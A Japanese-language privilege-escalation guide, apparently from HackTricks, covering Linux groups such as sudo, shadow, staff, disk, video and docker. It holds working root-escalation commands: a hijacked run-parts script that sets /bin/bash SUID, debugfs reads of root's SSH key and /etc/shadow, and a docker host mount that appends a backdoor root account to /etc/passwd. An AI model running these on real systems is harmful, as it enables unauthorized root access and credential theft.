# Interesting Groups - Linux Privesc

## Sudo/Admin Groups

### **PE - Method 1**

**場合によっては**、システムの **/etc/sudoers** ポリシー（またはそこから読み込まれるファイル）に、次のようなエントリが含まれています:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、いずれかのエントリに一致するユーザーが、`sudo` を通じて任意のターゲットユーザーとして任意のコマンドを実行できることを意味します（その他のポリシー条件に従います）。<sup>[[3]](#references)</sup>

この場合、**root になるには次を実行するだけです**：
```
sudo su
```
### PE - Method 2

すべての suid バイナリを検索し、**Pkexec** バイナリが存在するか確認します：
```bash
find / -perm -4000 2>/dev/null
```
**pkexec が SUID binary の場合**、polkit が要求された action を認可したときにのみ、別の user として program を実行できます。SUID bit だけでは root になることは保証されません。**sudo** または **admin** の membership が十分だと決めつけず、インストールされている policy と対象 session の authorization を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

古い Local Authority backend を引き続き使用している distribution では、次のコマンドでその group rules を確認します。
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
関連するグループ名とデフォルト値はディストリビューションによって異なります。この場合、ローカルポリシーでそのグループ名が指定されている場合にのみ、そのグループは有用です。<sup>[[5]](#references)</sup>

**rootになるには、次を実行できます**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
**pkexec** を実行しようとして、次の **エラー** が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
登録済みの authentication agent がない SSH session では、policy が本来その action を許可していても、`pkexec` が次の error で失敗することがあります。polkit は、desktop 以外の session 用の text authentication agent として `pkttyagent` をドキュメント化しています。正確な挙動は version や distribution に依存するため、ローカルの policy と agent の設定を確認してください。影響を受ける NixOS の version で報告されている workaround では、**2つの異なる SSH session** を使用します。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

場合によっては、sudoers policy に次のエントリが含まれていることもあります。
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、そのエントリに一致するすべてのユーザーが、`sudo` を通じて任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>

この場合、**root になるには次を実行するだけです**:
```
sudo su
```
## Shadow Group

権限によって許可されているシステムでは、**shadow** グループのユーザーが **/etc/shadow** を**読み取り**できます。対象で実際のモードと ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
それでは、ファイルを読み、**いくつかのハッシュを crack**してみましょう。

ハッシュを調査する際の、ロック状態に関する簡単な注意点:
- `!` または `*` が付いたエントリは、一般的にパスワードログインでは対話的に使用できません。
- `!hash` はパスワードがロックされていることを示します。残りの文字列は、ロックされる前のパスワードフィールドを表します。
- `*` を含むフィールドは有効な `crypt(3)` ハッシュではなく、UNIX パスワードによるログインを防ぎます。これだけから、以前にパスワードが設定されていたかどうかを推測しないでください。

これは、直接ログインがブロックされている場合でも、アカウントの分類に役立ちます。<sup>[[6]](#references)</sup>

## Staff Group

**staff**: root 権限を必要とせずに、ユーザーがシステム（`/usr/local`）へローカルな変更を追加できるようにします（`/usr/local/bin` の実行ファイルはすべてのユーザーの PATH 変数に含まれており、同じ名前の `/bin` や `/usr/bin` にある実行ファイルを「override」できる可能性がある点に注意してください）。監視やセキュリティにより関連する group `"adm"` と比較してください。<sup>[[2]](#references)[[7]](#references)</sup>

`PATH` 内で `/usr/local/bin` が `/usr/bin` より前にある Debian の設定（以下の例など）では、修飾されていないコマンドは最初に `/usr/local/bin` のコピーへ解決されます。対象の実効 `PATH` を確認してください。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
特権プロセスが書き込み可能な `/usr/local/bin` を介して修飾されていないコマンドを解決する場合、そのコマンドを置き換えることでプロセスの権限で実行できます。テスト前に実際のパスとトリガーを確認してください。

Ubuntu システムでは、ログイン時に `pam_motd` が root として `run-parts --lsbsysinit` を介して実行可能なスクリプトを実行します。cron ジョブでも `run-parts` が使用される場合がありますが、これはディストリビューションと設定によって異なります。<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
新しい SSH ログイン時に、`pspy` はこのパスが実際に対象上で呼び出されているかの確認に役立ち、root 権限なしでプロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## disk グループ

**disk** グループのメンバーシップにより、ブロックデバイスへの raw access が可能になり、しばしば**root access に近い状態**になります。Debian では、これはほぼ root と同等と説明されていますが、対象環境で実際のデバイス権限とストレージレイアウトを確認してください。<sup>[[7]](#references)</sup>

一般的なデバイスパスには `/dev/sd*` などがありますが、NVMe やその他のストレージレイアウトでは異なる名前が使用されます。
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs`はext2/ext3/ext4ファイルシステム上で動作します。上記の`/root`や`/etc/shadow`などのパスは開かれたファイルシステム内のファイルを示し、`dump`の2番目の引数はネイティブファイルシステム上の出力パスを示します。<sup>[[8]](#references)</sup> 例えば、次のコマンドは開かれたファイルシステムから`/tmp/asd1.txt`を抽出し、ネイティブファイルシステム上の`/tmp/asd2.txt`に出力します。
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステムにコピーします。直接編集するとファイルシステムが破損する可能性があるため、マウント済みの稼働中ファイルシステムでは使用せず、可能な場合はオフラインイメージ上で作業してください。<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video Group

`w`コマンドを使用すると、**システムにログインしているユーザー**を確認でき、次のような出力が表示されます。<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** エントリは、Linux の最初の仮想コンソールを示します。特にコンテナやその他の環境では、これだけでユーザーが物理的にマシンの前にいることが証明されるわけではありません。<sup>[[21]](#references)</sup>

読み取り可能な framebuffer device を公開しているシステムでは、**video** group のメンバーシップによって、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer interface では、`/dev/fb0` を画面 snapshot 用にコピーできる読み取り可能なメモリデバイスとして説明しています。`/sys/class/graphics/fb0/virtual_size` path は、その fbdev sysfs attribute が存在する環境でのみ利用できるため、まず対象を確認してください。<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
インストールされている **GIMP** バージョンが raw-data importer を提供している場合は、その importer で **`screen.raw`** を開きます。サポート状況と操作項目は、バージョンや plug-in によって異なります。<sup>[[22]](#references)</sup>

![Disk Group - Video Group: raw image を開くには GIMP を使用し、screen.raw ファイルを選択して、ファイルタイプとして Raw image data を選択します](<../../../images/image (463).png>)

画像の Width と Height を framebuffer geometry に合わせて設定し、出力が判読できるようになるまで、利用可能な pixel formats/Image Types を試します。<sup>[[9]](#references)</sup>

![Disk Group - Video Group: 次に Width と Height を画面で使用されている値に変更し、異なる Image Types を確認します（画面が最も見やすく表示されるものを選択します）](<../../../images/image (317).png>)

## root グループ

**root** グループのメンバーであっても root の UID が付与されるわけではありませんが、特権サービスやライブラリが使用する、`root` が所有するグループ書き込み可能なファイルは、依然として興味深い対象となる可能性があります。privilege-escalation の経路として扱う前に、ファイルの実際の権限とその使用方法を確認してください。

**root のメンバーが変更できるファイルを確認する**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker グループ

標準的な rootful インストールでは、`docker` グループのメンバーシップにより、Docker daemon への root レベルのアクセスが付与されます。bind mount はデフォルトで read-write であるため、その daemon を制御できるユーザーは、ホストの `/` をコンテナに mount してホストのファイルを変更できます。これは実質的にホスト上の root 権限を与えることになります。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
最後に、これまでの提案が気に入らない場合や、何らかの理由（docker api firewall?）で機能しない場合は、ここで説明されているように、**privileged container を実行してそこから escape する**こともできます。

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket への書き込み権限がある場合は、[**Docker socket を悪用して privileges を escalate する方法についてのこの記事**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd グループ

{{#ref}}
./
{{#endref}}

## Adm グループ

通常、**`adm`** グループの**メンバー**には、_/var/log/_ 内にある **log** ファイルを**読み取る**権限があります。\
したがって、このグループに属するユーザーを compromise した場合は、必ず**ログを確認**すべきです。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail グループ

これらのグループには、service や distribution に固有の意味があります。Debian では、`backup` は委任された backup/restore、`lp` は printer daemon、`mail` は `/var/mail` 用として文書化されているため、メンバーシップを privilege path とみなす前に、ローカルの permissions を確認してください。<sup>[[7]](#references)</sup>

これらは直接的な root vector というより、**credential-discovery** vector であることが多くあります。
- **backup**: configs、keys、DB dumps、tokens を含む archives が露出する可能性があります。
- **operator**: platform 固有の operational access により、機密性の高い runtime data が leak する可能性があります。
- **lp**: print queues/spools に document contents が含まれている可能性があります。
- **mail**: mail spools に reset links、OTPs、内部 credentials が含まれている可能性があります。

これらのグループへの所属は、価値の高い data exposure finding として扱い、password/token reuse を通じて pivot してください。

## Auth グループ

OpenBSD では、S/Key が設定されている場合、`/etc/skey` は `root:auth` が所有しており、その records への access には `auth` グループが必要です。YubiKey records は `/var/db/yubikey` に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/Key または YubiKey が有効になっている脆弱な OpenBSD 6.6 configuration では、`auth` privileges を持つ local users が root になることが可能でした。Qualys は prerequisite と exploit chain を文書化しており、リンク先の PoC がそれを実装しています。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI session なしでの pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian セキュリティマニュアル](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Frame Buffer Device — Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [root 以外の user として Docker を管理する](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [containers の実行 — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD の authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
